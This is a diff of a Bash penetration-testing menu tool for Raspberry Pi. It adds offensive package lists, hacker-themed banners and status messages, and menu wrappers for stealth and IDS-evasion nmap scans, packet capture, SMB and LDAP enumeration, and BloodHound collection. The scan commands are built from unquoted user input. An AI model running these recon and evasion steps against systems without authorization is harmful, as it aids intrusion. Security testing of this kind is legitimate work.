@@ -5,7 +5,7 @@
 # Compatible with Raspberry Pi (ARM architecture)
 # Enhanced with Phishing Tools, OSINT, Blue Teaming, and Extended Capabilities
 
-VERSION="3.0"                                         # Current framework version
+VERSION="3.1"                                         # Current framework version
 CONFIG_DIR="/home/evanmarr/.superhack"                # Base configuration directory
 LOG_DIR="$CONFIG_DIR/logs"                            # Directory for log files
 WORDLISTS_DIR="$CONFIG_DIR/wordlists"                 # Password lists and dictionaries
@@ -25,6 +25,39 @@ MAGENTA='\033[0;35m'                                  # Magenta: special highlig
 GREY='\033[0;90m'                                     # Grey: secondary info, disabled items
 NC='\033[0m'                                          # No Color: reset to default
 
+# Navigation history for <back> functionality
+declare -a INPUT_HISTORY
+HISTORY_INDEX=0
+
+# Current menu tracking for step display
+CURRENT_STEP=0
+TOTAL_STEPS=0
+CURRENT_CATEGORY=""
+
+# Hacker Quotes Database
+HACKER_QUOTES=(
+    "The only truly secure system is one that is powered off, cast in a block of concrete, and sealed in a lead-lined room with armed guards."
+    "Security is a process, not a product."
+    "There are only two types of companies: those that have been hacked and those that will be."
+    "Given enough eyeballs, all bugs are shallow."
+    "The weakest link in the security chain is the human element."
+    "Hackers are the immune system of the internet."
+    "If you think technology can solve your security problems, then you don't understand the problems and you don't understand the technology."
+    "Privacy is not an option, and it shouldn't be the price we accept for just getting on the Internet."
+    "The best defense is a good offense."
+    "In the world of cyber, the only constant is change."
+    "Trust but verify."
+    "Paranoia is just an awareness of all the ways things can go wrong."
+    "The code is the law."
+    "Information wants to be free."
+    "We are the music makers, and we are the dreamers of dreams."
+    "Any sufficiently advanced technology is indistinguishable from magic."
+    "With great power comes great responsibility."
+    "The system is only as strong as its weakest password."
+    "Enumeration is the key to the kingdom."
+    "Persistence is the key to success in penetration testing."
+)
+
 # =============================================================================
 # PACKAGE DEFINITIONS
 # =============================================================================
@@ -40,6 +73,12 @@ CORE_PACKAGES=(
     "openssl" "sshpass" "tmux" "screen" "vim" "nano" "lolcat" "clamav"
     "clamav-daemon" "rkhunter" "chkrootkit" "haveged" "libreoffice"
     "exiftool" "theharvester" "maltego" "spiderfoot" "recon-ng" "photon"
+    "ffuf" "wfuzz" "burpsuite" "zaproxy" "cewl" "medusa" "patator"
+    "whatweb" "wpscan" "commix" "beef-xss" "setoolkit" "social-engineer-toolkit"
+    " Powershell-empire" " starkiller" "bloodhound" "neo4j" "nuclei"
+    "amass" "subfinder" "assetfinder" "httpx-toolkit" "katana"
+    "gau" "waybackurls" "unfurl" "anew" "jq" "yq" "gron"
+    "docker.io" "docker-compose" "kubectl" "helm"
 )
 
 # Python packages for extended functionality
@@ -48,6 +87,17 @@ PYTHON_PACKAGES=(
     "smbprotocol" "ldap3" "pyftpdlib" "pysmb" "paramiko" "cryptography"
     "pyOpenSSL" "flask" "django" "mechanize" "selenium" "pyautogui"
     "shodan" "censys" "requests-html" "social-analyzer" "holehe"
+    "python-whois" "dnspython" "sublist3r" "theHarvester" "wafw00f"
+    "xsstrike" "sqlmap" "commix" "tplmap" "git-dumper" "git-hound"
+    "sherlock" "instagram-osint" "tiktok-downloader" "twint"
+    "linkedin-scraper" "facebook-scraper" "tweepy" "instaloader"
+    "waybackpy" "certstream" "subfinder-py" "amass-py" "nuclei-py"
+    "asyncio" "aiohttp" "httpx" "websockets" "pysocks" "stem"
+    "requests-futures" "cfscrape" "cloudscraper" "fake-useragent"
+    "scrapy" "playwright" "selenium-wire" "undetected-chromedriver"
+    "pycryptodome" "hashid" "name-that-hash" "johnny" "passlib"
+    "bcrypt" "argon2-cffi" "scrypt" "jwt" "pyjwt" "oauthlib"
+    "requests-oauthlib" "tweepy" "praw" "instagrapi" "pytelegrambotapi"
 )
 
 # Arrays to track missing packages during startup checks
@@ -64,6 +114,38 @@ if [[ $EUID -ne 0 ]]; then                            # Check Effective User ID 
     echo "Must run with sudo. Quitting!"             # Error message for non-root users
     exit 1                                           # Exit with error code 1
 fi
+
+# Global variable to store input
+USER_INPUT=""
+
+read_input() {
+    local prompt="$1"
+    local step_num="${2:-0}"
+    local total="${3:-0}"
+    local category="${4:-}"
+    
+    local step_indicator=""
+    if [[ $step_num -gt 0 && $total -gt 0 ]]; then
+        step_indicator="${CYAN}[Step $step_num of $total - ${category}]${NC} "
+    fi
+    
+    # Print prompt to stderr so it displays on terminal but doesn't get captured
+    echo -en "${step_indicator}${prompt}${NC}" >&2
+    read -r raw_input
+    
+    if [[ "$raw_input" == "<back>" ]]; then
+        USER_INPUT="99"
+        echo "99"
+        return 99
+    fi
+    
+    INPUT_HISTORY[$HISTORY_INDEX]="$raw_input"
+    ((HISTORY_INDEX++))
+    
+    USER_INPUT="$raw_input"
+    echo "$USER_INPUT"
+    return 0
+}
 
 # =============================================================================
 # UTILITY FUNCTIONS
@@ -132,13 +214,11 @@ save_results_prompt() {
     local subdir="$3"                                # Subdirectory under RESULTS_DIR
     
     echo ""
-    echo -n "Save results to file? (y/n): "
-    read save_choice
+    local save_choice=$(read_input "Save results to file? (y/n): ")
     
     # Process if user wants to save
     if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
-        echo -n "Enter filename (default: $default_filename): "
-        read custom_filename
+        local custom_filename=$(read_input "Enter filename (default: $default_filename): ")
         local filename="${custom_filename:-$default_filename}"  # Use default if empty
         
         # Ensure .txt extension for text files
@@ -163,12 +243,10 @@ save_command_output() {
     local subdir="$3"                                # Results subdirectory
     local description="$4"                           # Description for prompt
     
-    echo -n "Save $description to file? (y/n): "
-    read save_choice
+    local save_choice=$(read_input "Save $description to file? (y/n): ")
     
     if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
-        echo -n "Enter filename (default: $default_filename): "
-        read custom_filename
+        local custom_filename=$(read_input "Enter filename (default: $default_filename): ")
         local filename="${custom_filename:-$default_filename}"
         
         [[ "$filename" != *.txt ]] && filename="${filename}.txt"
@@ -260,12 +338,14 @@ clone_repo() {
 # DISPLAY FUNCTIONS
 # =============================================================================
 
-# Display ASCII art banner piped through lolcat
+# Display ASCII art banner with optional lolcat
 show_banner() {
     clear
-    # Check if lolcat is available, otherwise use standard colors
+    
+    # Check if lolcat is available
     if command -v lolcat &>/dev/null; then
-        cat << "EOF" | lolcat
+        # Use lolcat for rainbow effect with seed 17 - no ANSI codes when using lolcat
+        cat << "EOF" | lolcat --seed 17
     ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
     ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
     ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
@@ -273,7 +353,16 @@ show_banner() {
     ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 EOF
+        echo ""
+        # Display random hacker quote
+        local random_quote="${HACKER_QUOTES[$RANDOM % ${#HACKER_QUOTES[@]}]}"
+        echo "     \"$random_quote\"" | lolcat --seed 17
+        echo ""
+        echo "                    [ Raspberry Pi Edition v$VERSION ]" | lolcat --seed 17
+        echo "                    [ Authorized Use Only ]" | lolcat --seed 17
+        echo "                    [ Copywrite 2026 By Evan Marr ]" | lolcat --seed 17
     else
+        # Use standard ANSI colors when lolcat not available
         echo -e "${CYAN}"
         cat << "EOF"
     ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
@@ -284,22 +373,103 @@ EOF
     ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 EOF
         echo -e "${NC}"
-    fi
-    
-    if command -v lolcat &>/dev/null; then
-        echo "     The ultimate hacking multitool" | lolcat
-        echo "" | lolcat
-        echo "                    [ Raspberry Pi Edition v$VERSION ]" | lolcat
-        echo "                    [ Authorized Use Only ]" | lolcat
-        echo "                    [ Copywrite 2026 By Evan Marr ]" | lolcat
-    else
-        echo -e "${CYAN}     The ultimate hacking multitool${NC}"
-        echo -e ""
+        # Display random hacker quote
+        local random_quote="${HACKER_QUOTES[$RANDOM % ${#HACKER_QUOTES[@]}]}"
+        echo -e "${CYAN}     \"$random_quote\"${NC}"
+        echo ""
         echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
         echo -e "${RED}                    [ Authorized Use Only ]${NC}"
         echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
     fi
     echo ""
+}
+
+# Show menu with main banner and options
+# Arguments: $1 = menu title, $2 = menu options (newline separated)
+show_menu() {
+    local title="$1"
+    local options="$2"
+    
+    show_banner
+    echo -e "${CYAN}=== $title ===${NC}"
+    echo ""
+    echo -e "$options"
+    echo ""
+}
+
+# =============================================================================
+# LOADING BAR & HACKER STATUS FUNCTIONS
+# =============================================================================
+
+# Hacker-themed status messages
+HACKER_STATUS_MESSAGES=(
+    "Bypassing firewall rules..."
+    "Enumerating attack vectors..."
+    "Compiling exploit payloads..."
+    "Decrypting secure channels..."
+    "Scanning for open ports..."
+    "Injecting malicious packets..."
+    "Brute-forcing authentication..."
+    "Escalating privileges..."
+    "Establishing covert channels..."
+    "Mapping network topology..."
+    "Analyzing cryptographic hashes..."
+    "Spoofing MAC addresses..."
+    "Cracking WPA handshakes..."
+    "Harvesting credentials..."
+    "Deploying rootkits..."
+    "Intercepting traffic..."
+    "Pivoting through subnets..."
+    "Dumping memory segments..."
+    "Reverse engineering binaries..."
+    "Social engineering targets..."
+    "Scanning for vulnerabilities..."
+    "Exploiting buffer overflows..."
+    "Bypassing ASLR protection..."
+    "Injecting shellcode..."
+    "Maintaining persistence..."
+    "Covering tracks..."
+    "Exfiltrating data..."
+    "Compromising Active Directory..."
+    "Escalating to SYSTEM..."
+    "Creating backdoors..."
+)
+
+# Display a loading bar with percentage and hacker status messages
+show_loading_bar() {
+    local current=$1
+    local total=$2
+    local width=50
+    local percentage=$((current * 100 / total))
+    local filled=$((width * current / total))
+    local empty=$((width - filled))
+    
+    # Build the bar
+    local bar="["
+    for ((i=0; i<filled; i++)); do
+        bar+="█"
+    done
+    for ((i=0; i<empty; i++)); do
+        bar+="░"
+    done
+    bar+="]"
+    
+    # Clear line and print bar
+    printf "\r\033[K${CYAN}%s${NC} ${YELLOW}%d%%${NC}" "$bar" "$percentage"
+}
+
+# Show loading bar with rotating hacker status messages
+loading_with_status() {
+    local current=$1
+    local total=$2
+    local message_index=$3
+    
+    show_loading_bar "$current" "$total"
+    
+    # Show status message below the bar
+    local status_msg="${HACKER_STATUS_MESSAGES[$message_index % ${#HACKER_STATUS_MESSAGES[@]}]}"
+    printf "\n\033[K${GREY}  └─> %s${NC}" "$status_msg"
+    printf "\033[1A"  # Move cursor back up
 }
 
 # =============================================================================
@@ -320,27 +490,48 @@ is_python_installed() {
     python3 -c "import $import_name" 2>/dev/null
 }
 
-# Scan for missing packages and populate arrays
+# Scan for missing packages and populate arrays with loading bar
 check_missing_packages() {
     MISSING_PACKAGES=()
-    echo -e "${BLUE}[*] Checking system packages...${NC}"
+    MISSING_PYTHON=()
     
+    local total_packages=$((${#CORE_PACKAGES[@]} + ${#PYTHON_PACKAGES[@]}))
+    local current=0
+    local status_index=0
+    
+    echo -e "${BLUE}[*] Initializing dependency scan...${NC}"
+    echo ""
+    
+    # Check system packages
     for pkg in "${CORE_PACKAGES[@]}"; do
+        ((current++))
+        loading_with_status "$current" "$total_packages" "$status_index"
+        ((status_index++))
+        
         if ! dpkg -l 2>/dev/null | grep -q "^ii  $pkg " && ! command -v "$pkg" &>/dev/null; then
             MISSING_PACKAGES+=("$pkg")
-            echo -e "${GREY}    - Missing: $pkg${NC}"
         fi
+        
+        sleep 0.05  # Small delay for visual effect
     done
     
-    MISSING_PYTHON=()
-    echo -e "${BLUE}[*] Checking Python packages...${NC}"
-    
+    # Check Python packages
     for pkg in "${PYTHON_PACKAGES[@]}"; do
+        ((current++))
+        loading_with_status "$current" "$total_packages" "$status_index"
+        ((status_index++))
+        
         if ! is_python_installed "$pkg"; then
             MISSING_PYTHON+=("$pkg")
-            echo -e "${GREY}    - Missing: $pkg${NC}"
         fi
+        
+        sleep 0.03  # Small delay for visual effect
     done
+    
+    # Final clear and newline
+    printf "\n\033[K\n\033[K"
+    echo -e "${GREEN}[+] Dependency scan complete!${NC}"
+    echo ""
 }
 
 # Smart package manager - runs at startup
@@ -380,8 +571,7 @@ smart_package_manager() {
     echo "2) Select which packages to install"
     echo "3) Skip for now (not recommended)"
     echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    local choice=$(read_input "Choice: " 1 4 "Package Manager")
     
     case $choice in
         1) install_all_packages ;;
@@ -531,8 +721,7 @@ selective_package_install() {
     echo ""
     echo "0) Back to main menu"
     echo ""
-    echo -n "Enter package numbers (e.g., 1 3 5): "
-    read selections
+    local selections=$(read_input "Enter package numbers (e.g., 1 3 5): " 1 2 "Package Install")
     
     [[ "$selections" == "0" ]] && return
     
@@ -549,9 +738,7 @@ selective_package_install() {
         fi
     done
     
-    echo ""
-    echo -n "Download wordlists too? (y/n): "
-    read dl_wordlists
+    local dl_wordlists=$(read_input "Download wordlists too? (y/n): " 2 2 "Package Install")
     [[ "$dl_wordlists" == "y" ]] && download_wordlists
     
     echo -e "${GREEN}[+] Selected packages installed!${NC}"
@@ -640,66 +827,66 @@ check_install() {
 # Advanced customizable Nmap scanner with multiple options
 advanced_nmap_scan() {
     check_install nmap
-    echo -e "${BLUE}[*] Advanced Nmap Scanner${NC}"
-    echo ""
     
-    echo -n "Enter target(s) (IP, hostname, range, or file with -iL): "
-    read target
+    while true; do
+        show_menu "Advanced Nmap Scanner" "1) SYN Scan (-sS) - Stealth, requires root
+2) Connect Scan (-sT) - TCP connect
+3) UDP Scan (-sU) - UDP ports
+4) ACK Scan (-sA) - Firewall rule mapping
+5) Window Scan (-sW) - Similar to ACK
+6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy
+7) Comprehensive (Multiple types)
+0) Back to main menu"
+        
+        local scan_type=$(read_input "Select scan type: " 1 8 "Nmap Scan")
+        
+        [[ "$scan_type" == "0" ]] && return
+        [[ "$scan_type" == "99" ]] && continue
+        
+        local target=$(read_input "Enter target(s) (IP, hostname, range, or file with -iL): " 2 8 "Nmap Scan")
+        [[ -z "$target" ]] && continue
+        [[ "$target" == "99" ]] && continue
+        
+        break
+    done
     
-    echo ""
-    echo -e "${CYAN}=== SCAN TYPE ===${NC}"
-    echo "1) SYN Scan (-sS) - Stealth, requires root"
-    echo "2) Connect Scan (-sT) - TCP connect"
-    echo "3) UDP Scan (-sU) - UDP ports"
-    echo "4) ACK Scan (-sA) - Firewall rule mapping"
-    echo "5) Window Scan (-sW) - Similar to ACK"
-    echo "6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy"
-    echo "7) Comprehensive (Multiple types)"
-    echo "0) Back to main menu"
-    echo -n "Select scan type: "
-    read scan_type
+    while true; do
+        show_menu "Port Selection" "1) Top 100 common ports (--top-ports 100)
+2) Top 1000 common ports (--top-ports 1000)
+3) All 65535 ports (-p-)
+4) Specific ports (e.g., 80,443,8080)
+5) Default Nmap ports
+0) Back to main menu"
+        
+        local port_option=$(read_input "Select port option: " 3 8 "Nmap Scan")
+        [[ "$port_option" == "0" ]] && return
+        [[ "$port_option" == "99" ]] && continue
+        
+        # Configure port scanning options
+        case $port_option in
+            1) port_flag="--top-ports 100" ;;
+            2) port_flag="--top-ports 1000" ;;
+            3) port_flag="-p-" ;;
+            4) 
+                local custom_ports=$(read_input "Enter ports (comma-separated or range like 1-1000): " 4 8 "Nmap Scan")
+                [[ "$custom_ports" == "99" ]] && continue
+                port_flag="-p $custom_ports"
+                ;;
+            5) port_flag="" ;;
+        esac
+        break
+    done
     
-    [[ "$scan_type" == "0" ]] && return
+    # Additional options
+    show_menu "Additional Options" "Configure scan options..."
     
-    echo ""
-    echo -e "${CYAN}=== PORT SELECTION ===${NC}"
-    echo "1) Top 100 common ports (--top-ports 100)"
-    echo "2) Top 1000 common ports (--top-ports 1000)"
-    echo "3) All 65535 ports (-p-)"
-    echo "4) Specific ports (e.g., 80,443,8080)"
-    echo "5) Default Nmap ports"
-    echo "0) Back to main menu"
-    echo -n "Select port option: "
-    read port_option
-    
-    [[ "$port_option" == "0" ]] && return
-    
-    # Configure port scanning options
-    case $port_option in
-        1) port_flag="--top-ports 100" ;;
-        2) port_flag="--top-ports 1000" ;;
-        3) port_flag="-p-" ;;
-        4) 
-            echo -n "Enter ports (comma-separated or range like 1-1000): "
-            read custom_ports
-            port_flag="-p $custom_ports"
-            ;;
-        5) port_flag="" ;;
-    esac
-    
-    echo ""
-    echo -e "${CYAN}=== ADDITIONAL OPTIONS ===${NC}"
-    
-    echo -n "Enable service/version detection (-sV)? (y/n): "
-    read sv_detect
+    local sv_detect=$(read_input "Enable service/version detection (-sV)? (y/n): " 5 8 "Nmap Scan")
     [[ "$sv_detect" == "y" ]] && sv_flag="-sV" || sv_flag=""
     
-    echo -n "Enable OS detection (-O)? (y/n): "
-    read os_detect
+    local os_detect=$(read_input "Enable OS detection (-O)? (y/n): " 6 8 "Nmap Scan")
     [[ "$os_detect" == "y" ]] && os_flag="-O" || os_flag=""
     
-    echo -n "Enable aggressive scan (includes -sV -O --traceroute)? (y/n): "
-    read aggressive
+    local aggressive=$(read_input "Enable aggressive scan (includes -sV -O --traceroute)? (y/n): " 7 8 "Nmap Scan")
     if [[ "$aggressive" == "y" ]]; then
         agg_flag="-A"
         sv_flag=""
@@ -708,19 +895,16 @@ advanced_nmap_scan() {
         agg_flag=""
     fi
     
-    echo -n "Enable script scan? (y/n): "
-    read script_scan
+    local script_scan=$(read_input "Enable script scan? (y/n): " 8 8 "Nmap Scan")
     if [[ "$script_scan" == "y" ]]; then
-        echo "  Script categories:"
-        echo "  1) Default scripts (-sC)"
-        echo "  2) Safe scripts (--script safe)"
-        echo "  3) Vulnerability scripts (--script vuln)"
-        echo "  4) All scripts (--script all)"
-        echo "  5) Custom script (--script <name>)"
-        echo "  0) Back to main menu"
-        echo -n "  Select: "
-        read script_choice
+        show_menu "Script Categories" "1) Default scripts (-sC)
+2) Safe scripts (--script safe)
+3) Vulnerability scripts (--script vuln)
+4) All scripts (--script all)
+5) Custom script (--script <name>)
+0) Back to main menu"
         
+        local script_choice=$(read_input "Select: " 9 10 "Nmap Scan")
         [[ "$script_choice" == "0" ]] && return
         
         case $script_choice in
@@ -729,8 +913,7 @@ advanced_nmap_scan() {
             3) script_flag="--script vuln" ;;
             4) script_flag="--script all" ;;
             5) 
-                echo -n "Enter script name: "
-                read custom_script
+                local custom_script=$(read_input "Enter script name: " 10 10 "Nmap Scan")
                 script_flag="--script $custom_script"
                 ;;
         esac
@@ -738,18 +921,16 @@ advanced_nmap_scan() {
         script_flag=""
     fi
     
-    echo ""
-    echo -e "${CYAN}=== TIMING & PERFORMANCE ===${NC}"
-    echo "1) Paranoid (T0) - IDS evasion"
-    echo "2) Sneaky (T1)"
-    echo "3) Polite (T2)"
-    echo "4) Normal (T3)"
-    echo "5) Aggressive (T4)"
-    echo "6) Insane (T5)"
-    echo "0) Back to main menu"
-    echo -n "Select timing template: "
-    read timing
+    # Timing and performance
+    show_menu "Timing & Performance" "1) Paranoid (T0) - IDS evasion
+2) Sneaky (T1)
+3) Polite (T2)
+4) Normal (T3)
+5) Aggressive (T4)
+6) Insane (T5)
+0) Back to main menu"
     
+    local timing=$(read_input "Select timing template: " 1 2 "Nmap Timing")
     [[ "$timing" == "0" ]] && return
     
     case $timing in
@@ -762,17 +943,13 @@ advanced_nmap_scan() {
         *) time_flag="-T4" ;;
     esac
     
-    echo -n "Enable fragmentation (-f)? (y/n): "
-    read fragment
+    local fragment=$(read_input "Enable fragmentation (-f)? (y/n): " 2 2 "Nmap Timing")
     [[ "$fragment" == "y" ]] && frag_flag="-f" || frag_flag=""
     
-    echo -n "Enable verbose output (-v)? (y/n): "
-    read verbose
+    local verbose=$(read_input "Enable verbose output (-v)? (y/n): " 3 3 "Nmap Timing")
     [[ "$verbose" == "y" ]] && verb_flag="-v" || verb_flag=""
     
-    echo ""
-    echo -n "Auto-save results? (y/n): "
-    read auto_save
+    local auto_save=$(read_input "Auto-save results? (y/n): " 4 4 "Nmap Timing")
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
@@ -792,13 +969,11 @@ advanced_nmap_scan() {
         4) scan_flag="-sA" ;;
         5) scan_flag="-sW" ;;
         6) 
-            echo "Select specific stealth scan:"
-            echo "1) FIN (-sF)"
-            echo "2) NULL (-sN)"
-            echo "3) Xmas (-sX)"
-            echo "0) Back to main menu"
-            read stealth_choice
-            
+            show_menu "Stealth Scan Type" "1) FIN (-sF)
+2) NULL (-sN)
+3) Xmas (-sX)
+0) Back to main menu"
+            local stealth_choice=$(read_input "Select: " 1 2 "Stealth Scan")
             [[ "$stealth_choice" == "0" ]] && return
             
             case $stealth_choice in
@@ -815,10 +990,8 @@ advanced_nmap_scan() {
     # Build and execute nmap command
     local nmap_cmd="nmap $scan_flag $port_flag $sv_flag $os_flag $agg_flag $script_flag $time_flag $frag_flag $verb_flag $output_flag $target"
     
-    echo ""
-    echo -e "${CYAN}=== SCAN CONFIGURATION ===${NC}"
-    echo -e "${GREEN}Command: $nmap_cmd${NC}"
-    echo ""
+    show_menu "Scan Configuration" "Command: $nmap_cmd"
+    
     echo -n "Press Enter to start scan or Ctrl+C to cancel..."
     read
     
@@ -846,18 +1019,16 @@ advanced_nmap_scan() {
 # Network discovery via ping sweeps
 network_discovery() {
     check_install nmap
-    echo -e "${BLUE}[*] Network Discovery Module${NC}"
-    echo -n "Enter target subnet (e.g., 192.168.1.0/24): "
-    read subnet
     
+    show_menu "Network Discovery" "Scan a subnet for live hosts"
+    
+    local subnet=$(read_input "Enter target subnet (e.g., 192.168.1.0/24): " 1 2 "Network Discovery")
     [[ -z "$subnet" ]] && return
+    [[ "$subnet" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo -e "${YELLOW}[*] Scanning $subnet for live hosts...${NC}"
-    
-    echo -n "Auto-save results? (y/n): "
-    read auto_save
+    local auto_save=$(read_input "Auto-save results? (y/n): " 2 2 "Network Discovery")
     
     if [[ "$auto_save" == "y" ]]; then
         local output_file="$RESULTS_DIR/nmap/discovery_$timestamp.txt"
@@ -883,22 +1054,139 @@ port_scanner() {
 }
 
 # =============================================================================
+# WIRESHARK TERMINAL CAPTURE MODULE
+# =============================================================================
+
+# Terminal-based Wireshark capture using tshark
+wireshark_terminal() {
+    check_install wireshark tshark
+    
+    show_menu "Terminal Wireshark Capture" "Capture network traffic from the command line
+SPACE = Start/Stop capture (if supported)
+Q = Quit and return to menu
+Ctrl+C = Stop capture and exit"
+    
+    echo -n "Enter interface to capture on (e.g., eth0, wlan0, any): "
+    read capture_iface
+    [[ -z "$capture_iface" ]] && capture_iface="any"
+    
+    echo -n "Enter capture filter (or press Enter for none): "
+    read capture_filter
+    
+    echo -n "Enter packet count limit (0 = unlimited): "
+    read packet_count
+    packet_count=${packet_count:-0}
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local cap_file="$RESULTS_DIR/nmap/wireshark_$timestamp.pcap"
+    
+    echo ""
+    echo -e "${CYAN}=== Capture Controls ===${NC}"
+    echo "SPACE - Toggle pause/resume (if terminal supports it)"
+    echo "Q     - Quit and save"
+    echo "Ctrl+C - Stop and save"
+    echo ""
+    echo -e "${YELLOW}[*] Starting capture on $capture_iface...${NC}"
+    echo -e "${GREEN}[+] Saving to: $cap_file${NC}"
+    echo ""
+    
+    # Build tshark command
+    local tshark_cmd="tshark -i $capture_iface"
+    [[ -n "$capture_filter" ]] && tshark_cmd="$tshark_cmd -f \"$capture_filter\""
+    [[ $packet_count -gt 0 ]] && tshark_cmd="$tshark_cmd -c $packet_count"
+    tshark_cmd="$tshark_cmd -w $cap_file"
+    
+    # Run tshark with interactive controls
+    # Use script command to make it interactive
+    echo -e "${CYAN}Starting capture... Press Q then Enter to quit${NC}"
+    echo ""
+    
+    # Create a wrapper script for better control
+    cat > /tmp/tshark_wrapper.sh << EOF
+#!/bin/bash
+echo "Capture started. Commands:"
+echo "  stop - Stop capture and return to menu"
+echo "  status - Show capture status"
+echo ""
+
+tshark -i $capture_iface $([[ -n "$capture_filter" ]] && echo "-f \"$capture_filter\"") $([[ $packet_count -gt 0 ]] && echo "-c $packet_count") -w $cap_file &
+TSHARK_PID=\$!
+
+# Monitor for user input
+while true; do
+    read -t 1 cmd
+    if [[ "\$cmd" == "stop" || "\$cmd" == "q" || "\$cmd" == "Q" ]]; then
+        echo "Stopping capture..."
+        kill \$TSHARK_PID 2>/dev/null
+        wait \$TSHARK_PID 2>/dev/null
+        break
+    elif [[ "\$cmd" == "status" ]]; then
+        if kill -0 \$TSHARK_PID 2>/dev/null; then
+            echo "Capture running (PID: \$TSHARK_PID)"
+            ls -lh $cap_file 2>/dev/null && echo "File size: \$(ls -lh $cap_file | awk '{print \$5}')"
+        else
+            echo "Capture stopped"
+        fi
+    fi
+    
+    # Check if tshark is still running
+    if ! kill -0 \$TSHARK_PID 2>/dev/null; then
+        echo "Capture completed"
+        break
+    fi
+done
+
+echo "Capture saved to: $cap_file"
+EOF
+    
+    chmod +x /tmp/tshark_wrapper.sh
+    /tmp/tshark_wrapper.sh
+    
+    rm -f /tmp/tshark_wrapper.sh
+    
+    echo ""
+    if [[ -f "$cap_file" ]]; then
+        echo -e "${GREEN}[+] Capture saved: $cap_file${NC}"
+        echo -e "${CYAN}[*] File size: $(ls -lh $cap_file | awk '{print $5}')${NC}"
+        echo -e "${CYAN}[*] Packet count: $(tshark -r $cap_file -q 2>/dev/null | tail -1 | awk '{print $1}' || echo 'unknown')${NC}"
+        
+        echo -n "View capture summary? (y/n): "
+        read view_summary
+        if [[ "$view_summary" == "y" ]]; then
+            echo ""
+            echo -e "${CYAN}=== Capture Summary ===${NC}"
+            tshark -r $cap_file -q 2>/dev/null | tail -20
+        fi
+        
+        echo -n "Export to text? (y/n): "
+        read export_txt
+        if [[ "$export_txt" == "y" ]]; then
+            tshark -r $cap_file -V > "${cap_file}.txt" 2>/dev/null
+            echo -e "${GREEN}[+] Exported to: ${cap_file}.txt${NC}"
+        fi
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
 # ENUMERATION MODULES
 # =============================================================================
 
 # SMB enumeration for Windows file shares
 smb_enum() {
     check_install enum4linux-ng enum4linux-ng
-    echo -e "${BLUE}[*] SMB Enumeration Module${NC}"
-    echo -n "Enter target IP: "
-    read target
     
+    show_menu "SMB Enumeration" "Enumerate Windows SMB shares, users, and policies"
+    
+    local target=$(read_input "Enter target IP: " 1 2 "SMB Enumeration")
     [[ -z "$target" ]] && return
+    [[ "$target" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo -n "Auto-save results? (y/n): "
-    read auto_save
+    local auto_save=$(read_input "Auto-save results? (y/n): " 2 2 "SMB Enumeration")
     
     if [[ "$auto_save" == "y" ]]; then
         local output_file="$RESULTS_DIR/enumeration/smb_${target}_$timestamp.txt"
@@ -919,28 +1207,26 @@ smb_enum() {
 
 # LDAP/Active Directory enumeration
 ldap_enum() {
-    echo -e "${BLUE}[*] LDAP/Active Directory Enumeration${NC}"
-    echo -n "Enter target DC IP: "
-    read dc_ip
+    show_menu "LDAP/Active Directory Enumeration" "Query Active Directory and LDAP services"
     
+    local dc_ip=$(read_input "Enter target DC IP: " 1 5 "LDAP Enumeration")
     [[ -z "$dc_ip" ]] && return
+    [[ "$dc_ip" == "99" ]] && return
     
-    echo -n "Enter domain name (e.g., corp.local): "
-    read domain
+    local domain=$(read_input "Enter domain name (e.g., corp.local): " 2 5 "LDAP Enumeration")
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo ""
-    echo -e "${CYAN}=== LDAP ENUMERATION OPTIONS ===${NC}"
-    echo "1) Anonymous LDAP bind"
-    echo "2) Authenticated LDAP query"
-    echo "3) LDAP user enumeration"
-    echo "4) BloodHound data collection"
-    echo "0) Back to main menu"
-    echo -n "Select option: "
-    read ldap_choice
+    show_menu "LDAP Enumeration Options" "1) Anonymous LDAP bind
+2) Authenticated LDAP query
+3) LDAP user enumeration
+4) BloodHound data collection
+0) Back to main menu"
     
+    local ldap_choice=$(read_input "Select option: " 3 5 "LDAP Enumeration")
     [[ "$ldap_choice" == "0" ]] && return
+    [[ "$ldap_choice" == "99" ]] && return
     
     case $ldap_choice in
         1)
@@ -950,8 +1236,8 @@ ldap_enum() {
             save_results_prompt "$results" "ldap_anon_$timestamp.txt" "enumeration"
             ;;
         2)
-            echo -n "Enter username: "
-            read ldap_user
+            local ldap_user=$(read_input "Enter username: " 4 5 "LDAP Enumeration")
+            [[ "$ldap_user" == "99" ]] && return
             echo -n "Enter password: "
             read -s ldap_pass
             echo ""
@@ -976,14 +1262,14 @@ ldap_enum() {
             echo -e "${YELLOW}[*] Collecting BloodHound data...${NC}"
             local blood_dir="$RESULTS_DIR/enumeration/bloodhound_$timestamp"
             create_dir "$blood_dir"
-            echo -n "Enter username (optional, press Enter for anonymous): "
-            read bh_user
-            if [[ -n "$bh_user" ]]; then
+            local bh_user=$(read_input "Enter username (optional, press Enter for anonymous): " 5 5 "LDAP Enumeration")
+            if [[ -n "$bh_user" && "$bh_user" != "99" ]]; then
